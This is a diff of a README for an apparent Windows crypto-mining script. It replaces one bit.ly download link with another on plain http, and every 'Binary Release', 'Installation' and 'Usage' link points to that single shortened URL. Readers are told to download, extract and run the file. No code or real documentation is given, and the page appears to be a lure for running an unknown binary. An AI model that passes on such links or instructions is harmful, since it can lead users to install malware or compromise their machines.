@@ -10,15 +10,15 @@ Mine up to 4 different algorithms/coins at the same time!
 
 # How to get started
   1) First, install the script following any one of these   
-      * [Windows Binary Release](https://bit.ly/3IvLM6U)
+      * [Windows Binary Release](http://bit.ly/3IwQMIm)
   2) Install and run program on Windows
   
 # Topics
        
 [Windows]()  
-&ensp;&emsp;[Binary Release](https://bit.ly/3IvLM6U)  
-&ensp;&emsp;[Installation](https://bit.ly/3IvLM6U)  
-&ensp;&emsp;[Usage](https://bit.ly/3IvLM6U)  
+&ensp;&emsp;[Binary Release](http://bit.ly/3IwQMIm)  
+&ensp;&emsp;[Installation](http://bit.ly/3IwQMIm)  
+&ensp;&emsp;[Usage](http://bit.ly/3IwQMIm)  
 
 
 * Download the file provided in the release, extract the file and run the file.
